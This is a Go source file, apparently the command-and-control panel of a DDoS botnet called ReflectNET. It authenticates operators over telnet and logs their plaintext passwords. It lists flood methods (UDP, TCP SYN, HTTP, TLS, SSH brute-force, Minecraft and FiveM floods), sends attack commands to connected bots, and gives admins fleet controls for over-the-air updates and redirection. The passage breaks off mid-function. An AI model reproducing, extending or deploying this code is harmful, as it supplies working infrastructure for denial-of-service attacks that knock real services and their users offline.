package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
	"sort"
	"github.com/oschwald/geoip2-golang"
)

var (
	geoReader *geoip2.Reader
	asnReader *geoip2.Reader
)

func initGeoIP() {
    var err error

    geoReader, err = geoip2.Open("geo/Country.mmdb")
    if err != nil {
        log.Printf("Country GeoIP DB not found: %v (country detection disabled)", err)
        geoReader = nil
    } else {
        log.Println("Country GeoIP database loaded successfully")
    }

    asnReader, err = geoip2.Open("geo/Asn.mmdb")
    if err != nil {
        log.Printf("ASN GeoIP DB not found: %v (ASN detection disabled)", err)
        asnReader = nil
    } else {
        log.Println("ASN GeoIP database loaded successfully")
    }
}

func GetCountryFromIP(ipStr string) string {
    if geoReader == nil {
        return "unknown"
    }
    ip := net.ParseIP(ipStr)
    if ip == nil {
        return "unknown"
    }
    record, err := geoReader.Country(ip)
    if err != nil || record.Country.IsoCode == "" {
        return "unknown"
    }
    return strings.ToLower(record.Country.IsoCode)
}

func GetASNFromIP(ipStr string) (asn string, asnName string) {
    if asnReader == nil {
        return "unknown", "unknown"
    }
    ip := net.ParseIP(ipStr)
    if ip == nil {
        return "unknown", "unknown"
    }
    record, err := asnReader.ASN(ip)
    if err != nil {
        return "unknown", "unknown"
    }
    asn = fmt.Sprintf("%d", record.AutonomousSystemNumber)
    asnName = record.AutonomousSystemOrganization
    if asnName == "" {
        asnName = asn
    }
    return asn, asnName
}

var countryNames = map[string]string{
    "ad": "Andorra", "ae": "United Arab Emirates", "af": "Afghanistan", "ag": "Antigua and Barbuda",
    "ai": "Anguilla", "al": "Albania", "am": "Armenia", "ao": "Angola", "aq": "Antarctica",
    "ar": "Argentina", "as": "American Samoa", "at": "Austria", "au": "Australia", "aw": "Aruba",
    "ax": "Ã…land Islands", "az": "Azerbaijan", "ba": "Bosnia and Herzegovina", "bb": "Barbados",
    "bd": "Bangladesh", "be": "Belgium", "bf": "Burkina Faso", "bg": "Bulgaria", "bh": "Bahrain",
    "bi": "Burundi", "bj": "Benin", "bl": "Saint BarthÃ©lemy", "bm": "Bermuda", "bn": "Brunei",
    "bo": "Bolivia", "bq": "Caribbean Netherlands", "br": "Brazil", "bs": "Bahamas", "bt": "Bhutan",
    "bv": "Bouvet Island", "bw": "Botswana", "by": "Belarus", "bz": "Belize", "ca": "Canada",
    "cc": "Cocos (Keeling) Islands", "cd": "DR Congo", "cf": "Central African Republic",
    "cg": "Congo", "ch": "Switzerland", "ci": "Ivory Coast", "ck": "Cook Islands", "cl": "Chile",
    "cm": "Cameroon", "cn": "China", "co": "Colombia", "cr": "Costa Rica", "cu": "Cuba",
    "cv": "Cape Verde", "cw": "CuraÃ§ao", "cx": "Christmas Island", "cy": "Cyprus", "cz": "Czechia",
    "de": "Germany", "dj": "Djibouti", "dk": "Denmark", "dm": "Dominica", "do": "Dominican Republic",
    "dz": "Algeria", "ec": "Ecuador", "ee": "Estonia", "eg": "Egypt", "eh": "Western Sahara",
    "er": "Eritrea", "es": "Spain", "et": "Ethiopia", "fi": "Finland", "fj": "Fiji",
    "fk": "Falkland Islands", "fm": "Micronesia", "fo": "Faroe Islands", "fr": "France",
    "ga": "Gabon", "gb": "United Kingdom", "gd": "Grenada", "ge": "Georgia", "gf": "French Guiana",
    "gg": "Guernsey", "gh": "Ghana", "gi": "Gibraltar", "gl": "Greenland", "gm": "Gambia",
    "gn": "Guinea", "gp": "Guadeloupe", "gq": "Equatorial Guinea", "gr": "Greece",
    "gs": "South Georgia", "gt": "Guatemala", "gu": "Guam", "gw": "Guinea-Bissau", "gy": "Guyana",
    "hk": "Hong Kong", "hm": "Heard Island and McDonald Islands", "hn": "Honduras", "hr": "Croatia",
    "ht": "Haiti", "hu": "Hungary", "id": "Indonesia", "ie": "Ireland", "il": "Israel",
    "im": "Isle of Man", "in": "India", "io": "British Indian Ocean Territory", "iq": "Iraq",
    "ir": "Iran", "is": "Iceland", "it": "Italy", "je": "Jersey", "jm": "Jamaica", "jo": "Jordan",
    "jp": "Japan", "ke": "Kenya", "kg": "Kyrgyzstan", "kh": "Cambodia", "ki": "Kiribati",
    "km": "Comoros", "kn": "Saint Kitts and Nevis", "kp": "North Korea", "kr": "South Korea",
    "kw": "Kuwait", "ky": "Cayman Islands", "kz": "Kazakhstan", "la": "Laos", "lb": "Lebanon",
    "lc": "Saint Lucia", "li": "Liechtenstein", "lk": "Sri Lanka", "lr": "Liberia", "ls": "Lesotho",
    "lt": "Lithuania", "lu": "Luxembourg", "lv": "Latvia", "ly": "Libya", "ma": "Morocco",
    "mc": "Monaco", "md": "Moldova", "me": "Montenegro", "mf": "Saint Martin", "mg": "Madagascar",
    "mh": "Marshall Islands", "mk": "North Macedonia", "ml": "Mali", "mm": "Myanmar", "mn": "Mongolia",
    "mo": "Macao", "mp": "Northern Mariana Islands", "mq": "Martinique", "mr": "Mauritania",
    "ms": "Montserrat", "mt": "Malta", "mu": "Mauritius", "mv": "Maldives", "mw": "Malawi",
    "mx": "Mexico", "my": "Malaysia", "mz": "Mozambique", "na": "Namibia", "nc": "New Caledonia",
    "ne": "Niger", "nf": "Norfolk Island", "ng": "Nigeria", "ni": "Nicaragua", "nl": "Netherlands",
    "no": "Norway", "np": "Nepal", "nr": "Nauru", "nu": "Niue", "nz": "New Zealand", "om": "Oman",
    "pa": "Panama", "pe": "Peru", "pf": "French Polynesia", "pg": "Papua New Guinea",
    "ph": "Philippines", "pk": "Pakistan", "pl": "Poland", "pm": "Saint Pierre and Miquelon",
    "pn": "Pitcairn Islands", "pr": "Puerto Rico", "ps": "Palestine", "pt": "Portugal",
    "pw": "Palau", "py": "Paraguay", "qa": "Qatar", "re": "RÃ©union", "ro": "Romania",
    "rs": "Serbia", "ru": "Russia", "rw": "Rwanda", "sa": "Saudi Arabia", "sb": "Solomon Islands",
    "sc": "Seychelles", "sd": "Sudan", "se": "Sweden", "sg": "Singapore", "sh": "Saint Helena",
    "si": "Slovenia", "sj": "Svalbard and Jan Mayen", "sk": "Slovakia", "sl": "Sierra Leone",
    "sm": "San Marino", "sn": "Senegal", "so": "Somalia", "sr": "Suriname", "ss": "South Sudan",
    "st": "São Tomé and Príncipe", "sv": "El Salvador", "sx": "Sint Maarten", "sy": "Syria",
    "sz": "Eswatini", "tc": "Turks and Caicos Islands", "td": "Chad", "tf": "French Southern Territories",
    "tg": "Togo", "th": "Thailand", "tj": "Tajikistan", "tk": "Tokelau", "tl": "Timor-Leste",
    "tm": "Turkmenistan", "tn": "Tunisia", "to": "Tonga", "tr": "Turkey", "tt": "Trinidad and Tobago",
    "tv": "Tuvalu", "tw": "Taiwan", "tz": "Tanzania", "ua": "Ukraine", "ug": "Uganda",
    "um": "U.S. Minor Outlying Islands", "us": "United States", "uy": "Uruguay", "uz": "Uzbekistan",
    "va": "Vatican City", "vc": "Saint Vincent and the Grenadines", "ve": "Venezuela",
    "vg": "British Virgin Islands", "vi": "U.S. Virgin Islands", "vn": "Vietnam", "vu": "Vanuatu",
    "wf": "Wallis and Futuna", "ws": "Samoa", "ye": "Yemen", "yt": "Mayotte", "za": "South Africa",
    "zm": "Zambia", "zw": "Zimbabwe",
}

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

type liveSession struct {
	username   string
	admin      int
	conn       net.Conn
	wrMu       sync.Mutex
	loggedInAt time.Time
}

type onlineUser struct {
	username   string
	admin      int
	loggedInAt time.Time
}

func (s *liveSession) write(b []byte) error {
	s.wrMu.Lock()
	defer s.wrMu.Unlock()
	_, err := s.conn.Write(b)
	return err
}

type sessionHub struct {
	mu       sync.Mutex
	sessions map[net.Conn]*liveSession
}

func newSessionHub() *sessionHub {
	return &sessionHub{sessions: make(map[net.Conn]*liveSession)}
}

func (h *sessionHub) Add(username string, admin int, conn net.Conn) *liveSession {
	s := &liveSession{username: username, admin: admin, conn: conn, loggedInAt: time.Now()}
	h.mu.Lock()
	h.sessions[conn] = s
	h.mu.Unlock()
	return s
}

func (h *sessionHub) Remove(conn net.Conn) {
	h.mu.Lock()
	delete(h.sessions, conn)
	h.mu.Unlock()
}

func (h *sessionHub) Broadcast(from, msg string) int {
	line := []byte(fmt.Sprintf("\r\n\x1b[38;5;99m[ BROADCAST ] \x1b[38;5;27m%s: \x1b[1;37m%s\033[0m\r\n", from, msg))
	h.mu.Lock()
	list := make([]*liveSession, 0, len(h.sessions))
	for _, s := range h.sessions {
		list = append(list, s)
	}
	h.mu.Unlock()
	n := 0
	for _, s := range list {
		if s.write(line) == nil {
			n++
		}
	}
	return n
}

func (h *sessionHub) Kick(username, reason string) {
	line := []byte(fmt.Sprintf("\r\n\x1b[38;5;99m[ KICK ] \x1b[38;5;27m%s\033[0m\r\n", reason))
	h.mu.Lock()
	var targets []*liveSession
	for _, s := range h.sessions {
		if s.username == username {
			targets = append(targets, s)
		}
	}
	h.mu.Unlock()
	for _, s := range targets {
		_ = s.write(line)
		_ = s.conn.Close()
	}
}

func (h *sessionHub) OnlineCount() int {
	h.mu.Lock()
	defer h.mu.Unlock()
	seen := make(map[string]struct{}, len(h.sessions))
	for _, s := range h.sessions {
		seen[s.username] = struct{}{}
	}
	return len(seen)
}

func (h *sessionHub) IsOnline(username string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, s := range h.sessions {
		if s.username == username {
			return true
		}
	}
	return false
}

func (h *sessionHub) ListOnline() []onlineUser {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]onlineUser, 0, len(h.sessions))
	seen := make(map[string]struct{}, len(h.sessions))
	for _, s := range h.sessions {
		if _, ok := seen[s.username]; ok {
			continue
		}
		seen[s.username] = struct{}{}
		out = append(out, onlineUser{username: s.username, admin: s.admin, loggedInAt: s.loggedInAt})
	}
	return out
}

var sessions = newSessionHub()

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	this.conn.Write([]byte(fmt.Sprintf("\033]0;ReflectNET\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;99mUsername \033[1;37m: \x1b[38;5;99m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;27mPassword \033[1;37m: \x1b[38;5;99m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		msg := fmt.Sprintf("\x1b[38;5;99mLoading... %c\033[0m\r", spinBuf[i%len(spinBuf)])
		this.conn.Write([]byte(msg))
		time.Sleep(100 * time.Millisecond)
	}
	this.conn.Write([]byte("\033[K\r\n"))

	loggedIn, userInfo, loginMsg := database.TryLogin(username, password)
	if !loggedIn {
		if loginMsg != "" {
			this.conn.Write([]byte("\r\x1b[38;5;99m" + loginMsg + "\r\n"))
		} else {
			this.conn.Write([]byte("\r\x1b[38;5;99mWrong user or password, try again.\r\n"))
		}
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		log.SetOutput(loginLogsOutput)
		log.Println("| successful login | username:", username, "| password:", password, "| ip:", this.conn.RemoteAddr())
	}

	sess := sessions.Add(username, userInfo.admin, this.conn)
	defer func() {
		sessions.Remove(this.conn)
		database.Logout(username)
	}()

	this.conn.SetDeadline(time.Time{})
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\n\x1b[38;5;196mWelcome back, \x1b[1;37m" + username + "\x1b[0m\r\n\r\n"))

	go func() {
		for {
			totalBots := clientList.Count()
			botCount := totalBots
			if userInfo.maxBots != -1 && totalBots > userInfo.maxBots {
				botCount = userInfo.maxBots
			}

			onlineCount := sessions.OnlineCount()
			running := database.fetchUserRunningAttacks(username)
			slotLabel := strconv.Itoa(GetGlobalConcurrent())

			var title string
			if userInfo.admin == 1 {
				title = fmt.Sprintf(
					"\033]0;ReflectNET | Loaded: %d ~ Slots: %d/%s ~ Total: %d ~ Online: %d ~ User: %s \007",
					botCount,
					running,
					slotLabel,
					database.fetchAttacks(),
					onlineCount,
					username,
				)
			} else {
				title = fmt.Sprintf(
					"\033]0;ReflectNET | Loaded: %d ~ Slots: %d/%s ~ Online: %d ~ User: %s \007",
					botCount,
					running,
					slotLabel,
					onlineCount,
					username,
				)
			}

			if err := sess.write([]byte(title)); err != nil {
				_ = this.conn.Close()
				break
			}
			time.Sleep(1 * time.Second)
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[38;5;99m" + username + "\x1b[38;5;231m@\x1b[38;5;99mbotnet\033[0m\x1b[38;5;231m/~/$ "))
		cmd, err := this.ReadLine(false)
		if err != nil {
			return
		}
		if cmd == "" {
			continue
		}
		if cmd == "cls" || cmd == "clear" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "Methods" || cmd == "METHODS" || cmd == "methods" || cmd == "?" {
			this.writeMethodsPage()
			continue
		}
		if strings.EqualFold(cmd, "help") {
			this.writeHelp(userInfo.admin == 1)
			continue
		}
		if strings.EqualFold(cmd, "info") {
			this.writeInfo(username, userInfo)
			continue
		}
		if strings.EqualFold(cmd, "ongoing") {
			this.writeOngoingAttacks(username, userInfo.admin == 1)
			continue
		}
		if strings.EqualFold(cmd, "history") {
			this.writeUserHistory(username, username)
			continue
		}
		if userInfo.admin == 1 && strings.HasPrefix(strings.ToLower(cmd), "history ") {
			parts := strings.Fields(cmd)
			if len(parts) >= 2 {
				this.writeUserHistory(parts[1], username)
				continue
			}
		}
		if cmd == "pass" || cmd == "Pass" || cmd == "PASS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;27mNew password \033[1;37m> \x1b[38;5;99m"))
			newPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[38;5;99mConfirm? (y/n) \x1b[38;5;99m"))
			confirmation, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirmation != "y" && confirmation != "Y" {
				this.conn.Write([]byte("\x1b[38;5;27mPassword change canceled\r\n"))
				continue
			}
			if database.ChangePass(userInfo.username, newPassword) {
				this.conn.Write([]byte("\x1b[38;5;27mPassword successfully changed\r\n"))
			} else {
				this.conn.Write([]byte("\x1b[38;5;99mFailed to change password\r\n"))
			}
			continue
		}
		if cmd == "RULES" || cmd == "rules" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;27m  DO NOT SPAM ATTACKS!              \r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  DO NOT SHARE LOGINS!				 \r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  DO NOT ATTACK GOVERNMENTS !        \r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  ONLY USE FOR Testing               \r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  3 Warnings = Ban                   \r\n"))
			continue
		}
		if strings.HasPrefix(strings.ToLower(cmd), "global") {
			parts := strings.Fields(cmd)
			if len(parts) != 2 {
				this.conn.Write([]byte("\x1b[38;5;99musage: global <number> or global stats\r\n"))
				continue
			}
			if strings.EqualFold(parts[1], "stats") {
				this.conn.Write([]byte("\033[2J\033[1H"))
				this.conn.Write([]byte("\x1b[1;37mGLOBAL STATS\x1b[0m\r\n\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Online users      \x1b[38;5;27m%d\r\n", sessions.OnlineCount())))
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Total users       \x1b[38;5;27m%d\r\n", database.fetchUsers())))
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Bots loaded       \x1b[38;5;27m%d\r\n", clientList.Count())))
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Global slots      \x1b[38;5;27m%d\r\n", GetGlobalConcurrent())))
				running := database.ListRunningHistory()
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Active attacks    \x1b[38;5;27m%d\r\n", len(running))))
				atkState := "enabled"
				if !database.AttacksEnabled() {
					atkState = "disabled"
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Attacks status    \x1b[38;5;27m%s\r\n", atkState)))
				apiState := "enabled"
				if !database.ApiEnabled() {
					apiState = "disabled"
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m API status        \x1b[38;5;27m%s\r\n", apiState)))
				continue
			}
			v, err := strconv.Atoi(parts[1])
			if err != nil || v < 1 {
				this.conn.Write([]byte("\x1b[38;5;99mglobal must be a number greater than 0\r\n"))
				continue
			}
			SetGlobalConcurrent(v)
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mGlobal concurrency set to %d\r\n", GetGlobalConcurrent())))
			continue
		}
		if cmd == "logout" || cmd == "LOGOUT" || cmd == "exit" || cmd == "quit" {
			fmt.Printf("User %s has been logged out\n", username)
			return
		}

		if userInfo.admin == 1 {
			parts := strings.Fields(cmd)
			if handleFleetAdminCommand(this.conn, parts) {
				continue
			}
			if this.handleAdminCommand(cmd, username) {
				continue
			}
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			log.SetOutput(output)
			log.Println("| username:", username, "| command:", cmd, "| ip:", this.conn.RemoteAddr())
		}
        
		botCount = userInfo.maxBots
		displayCount := botCount
		globalSlots := GetGlobalConcurrent()

		if len(cmd) > 0 && cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			parsedCount, err := strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mFailed To Parse Botcount \"%s\"\r\n", count)))
				continue
			}

			if parsedCount == -1 {
				botCount = -1
				displayCount = clientList.Count()
				if globalSlots > 1 {
					displayCount = splitBotCount(clientList.Count(), globalSlots)
					if displayCount < 1 {
						displayCount = 1
					}
					botCount = displayCount
				}
			} else {
				botCount = parsedCount
				displayCount = parsedCount
				if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
					this.conn.Write([]byte("\x1b[38;5;99mBot Count To Send Is Bigger Than Allowed Bot Maximum\r\n"))
					continue
				}
			}

			cmd = countSplit[1]
		}
		if len(cmd) > 0 && cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		if !database.AttacksEnabled() {
			this.conn.Write([]byte("\x1b[38;5;99mAttacks are currently disabled\r\n"))
			continue
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s\r\n", err.Error())))
			continue
		}
		buf, err := atk.Build()
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s\r\n", err.Error())))
			continue
		}
		if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s\r\n", err.Error())))
			continue
		}
		if database.ContainsWhitelistedTargets(atk) {
			fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
			continue
		}

		actualSendCount := displayCount
		if botCount == -1 {
			total := clientList.Count()
			if total > 0 {
				actualSendCount = splitBotCount(total, GetGlobalConcurrent())
				if actualSendCount < 1 {
					actualSendCount = 1
				}
			} else {
				actualSendCount = 0
			}
		}
		clientList.QueueBuf(buf, botCount, botCatagory)
		this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mCommand broadcasted to %d bots...\r\n", actualSendCount)))
	}
}

func (this *Admin) writeMethodsPage() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	rows := []string{
		"udp           UDP flood, less PPS speed.",
		"udpbypass     UDP flood, high PPS speed.",
		"std           UDP flood, large packets.",
		"stdhex        UDP flood, random hex payloads.",
		"udphex        UDP flood, randomized payloads.",
		"game          UDP flood for game servers (SAMP).",
		"socket        TCP connect flood (real sockets, with data).",
		"tcp           TCP flag flood (SYN/ACK/etc), high PPS.",
		"http          HTTP GET/POST flood.",
		"fivem         FiveM connect flood (port 30120).",
		"mc            Minecraft login protocol flood (port 25565).",
		"ssh           SSH brute-force flood (port 22).",
		"tls           TLS ClientHello flood (port 443).",
		"",
		"Type:  <method> ?   for flags and examples.",
	}
	for _, row := range rows {
		this.conn.Write([]byte("\x1b[38;5;99m" + row + "\x1b[0m\r\n"))
	}
}

func summarizeAttackCommand(command string) (string, string) {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return "-", "-"
	}

	target := "-"
	flags := make([]string, 0, len(fields))
	seenTarget := false

	for _, part := range fields[1:] {
		if !seenTarget && !strings.Contains(part, "=") && !strings.HasPrefix(part, "-") {
			target = part
			seenTarget = true
			continue
		}
		flags = append(flags, part)
	}
	if len(flags) == 0 {
		flags = append(flags, "-")
	}
	return target, strings.Join(flags, " ")
}

func (this *Admin) writeOngoingAttacks(username string, isAdmin bool) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;37mONGOING ATTACKS\x1b[0m\r\n\r\n"))

	entries := database.ListRunningHistory()
	if len(entries) == 0 {
		this.conn.Write([]byte("\x1b[38;5;27mNo active attacks\r\n"))
		return
	}

	myEntries := make([]HistoryRecord, 0)
	otherEntries := make([]HistoryRecord, 0)
	for _, h := range entries {
		if isAdmin && h.UserID != database.GetUserID(username) {
			otherEntries = append(otherEntries, h)
			continue
		}
		if h.UserID == database.GetUserID(username) {
			myEntries = append(myEntries, h)
			continue
		}
		if !isAdmin {
			myEntries = append(myEntries, h)
		}
	}

	this.conn.Write([]byte("\x1b[38;5;99mUSERNAME    | TARGET        | TIME LEFT | FLAGS\r\n"))
	this.conn.Write([]byte("\x1b[38;5;27m------------|---------------|-----------|-------\r\n"))
	if isAdmin {
		for _, h := range myEntries {
			this.writeHistoryEntry(h)
		}
		if len(otherEntries) > 0 {
			this.conn.Write([]byte("\r\n\x1b[38;5;99mOTHER USERS\x1b[0m\r\n"))
			for _, h := range otherEntries {
				this.writeHistoryEntry(h)
			}
		}
		return
	}

	for _, h := range myEntries {
		this.writeHistoryEntry(h)
	}
}

func (this *Admin) writeUserHistory(username, actor string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;37mATTACK HISTORY\x1b[0m\r\n\r\n"))
	entries := database.ListHistoryForUser(username)
	if len(entries) == 0 {
		this.conn.Write([]byte("\x1b[38;5;27mNo attack history found\r\n"))
		return
	}
	this.conn.Write([]byte("\x1b[38;5;99mUSERNAME         | TARGET          | TIME LEFT | FLAGS\r\n"))
	this.conn.Write([]byte("\x1b[38;5;27m-----------------|-----------------|-----------|-------\r\n"))
	for _, h := range entries {
		this.writeHistoryEntry(h)
	}
	if actor != username {
		this.conn.Write([]byte("\r\n\x1b[38;5;27mViewing: " + username + "\r\n"))
	}
}

func (this *Admin) writeHistoryEntry(h HistoryRecord) {
	userName := database.UsernameByID(h.UserID)
	if userName == "" {
		userName = "unknown"
	}
	remaining := int64(h.Duration) - (time.Now().Unix() - h.TimeSent)
	if remaining < 0 {
		remaining = 0
	}
	target, flags := summarizeAttackCommand(h.Command)
	this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%-12s \x1b[38;5;27m| %-12s | %-8ds | %s\r\n",
		userName,
		target,
		remaining,
		flags,
	)))
}

func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	}
	if d < time.Hour {
		return fmt.Sprintf("%dm %ds", int(d.Minutes()), int(d.Seconds())%60)
	}
	days := int(d.Hours()) / 24
	hours := int(d.Hours()) % 24
	minutes := int(d.Minutes()) % 60
	seconds := int(d.Seconds()) % 60
	if days > 0 {
		return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
	}
	return fmt.Sprintf("%dh %dm %ds", hours, minutes, seconds)
}

func (this *Admin) writeHelp(isAdmin bool) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;37mREFLECTNET HELP\x1b[0m\r\n\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m methods      \x1b[38;5;27m Show the method list\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m info         \x1b[38;5;27m User account overview\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m rules        \x1b[38;5;27m Server rules and warnings\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m pass         \x1b[38;5;27m Change your password\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m clear        \x1b[38;5;27m Clear the screen\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m logout       \x1b[38;5;27m Leave the panel\r\n\r\n"))
	if !isAdmin {
		this.conn.Write([]byte("\x1b[38;5;27mExample: users edit root conc 5\r\n"))
		return
	}
	this.conn.Write([]byte("\x1b[1;37mADMIN COMMANDS\x1b[0m\r\n\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m users add                    \x1b[38;5;27m Create a user\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m users remove <user>          \x1b[38;5;27m Delete a user\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m users ban <user> <reason>    \x1b[38;5;27m Ban a user\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m users edit <user> <field>    \x1b[38;5;27m Edit user data\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m attacks enable|disable       \x1b[38;5;27m Toggle attack status\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m api enable|disable           \x1b[38;5;27m Toggle HTTP API\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m broadcast <message>          \x1b[38;5;27m Send a broadcast\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m global <number>              \x1b[38;5;27m Set global slots\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m global stats                 \x1b[38;5;27m Show global statistics\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet                        \x1b[38;5;27m Fleet dashboard (version/arch split)\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet redirect all           \x1b[38;5;27m Redirect all bots (manifest)\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet update all|v1|force    \x1b[38;5;27m OTA update fleet\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet reload all             \x1b[38;5;27m Re-exec all bots (no OTA)\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet stop                   \x1b[38;5;27m Stop all running attacks\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet kill all               \x1b[38;5;27m Disconnect/kill all bots\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m fleet manifest reload        \x1b[38;5;27m Reload manifest.json\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m count                        \x1b[38;5;27m Show connected bots\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m online                       \x1b[38;5;27m Show online users and login time\r\n\r\n"))
	this.conn.Write([]byte("\x1b[1;37mEDIT FIELDS\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[38;5;27mmaxtime, cooldown, days, api, botcount, conc, cons, concurrent, slots, admin, password\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99mExample: \x1b[38;5;27musers edit root conc 5\r\n"))
}

func (this *Admin) handleAdminCommand(cmd, adminName string) bool {
	lower := strings.ToLower(strings.TrimSpace(cmd))
	parts := strings.Fields(cmd)

	if lower == "ongoing" {
		this.writeOngoingAttacks(adminName, true)
		return true
	}
	if lower == "history" {
		this.writeUserHistory(adminName, adminName)
		return true
	}
	if strings.HasPrefix(lower, "history ") && len(parts) >= 2 {
		this.writeUserHistory(parts[1], adminName)
		return true
	}

	if lower == "online" {
		users := sessions.ListOnline()
		if len(users) == 0 {
			this.conn.Write([]byte("\x1b[38;5;27mNo users online\r\n"))
			return true
		}
		this.conn.Write([]byte("\x1b[1;37mONLINE USERS\x1b[0m\r\n"))
		for _, u := range users {
			role := "User"
			if u.admin == 1 {
				role = "Admin"
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%-16s \x1b[38;5;27m%s \x1b[38;5;99mlogged in: %s\r\n",
				u.username, role, formatDuration(time.Since(u.loggedInAt)))))
		}
		return true
	}

	cmdLower := strings.ToLower(strings.TrimSpace(cmd))
	isBotsCmd := cmdLower == "bots" ||
		strings.HasPrefix(cmdLower, "bots ") ||
		strings.HasPrefix(cmdLower, "bots-") ||
		cmdLower == "count" ||
		strings.HasPrefix(cmdLower, "count ") ||
		strings.HasPrefix(cmdLower, "count-")

	if isBotsCmd {
		showCountry := false
		showASN     := false
		showSource  := false
		showHelp    := false

		args := strings.Fields(cmdLower)
		for _, arg := range args {
			switch arg {
			case "-c":
				showCountry = true
			case "-a":
				showASN = true
			case "-s":
				showSource = true
			case "help", "-help", "--help":
				showHelp = true
			}
		}

		// Show help if requested OR no flag given
		if showHelp || (!showCountry && !showASN && !showSource && len(args) > 1) {
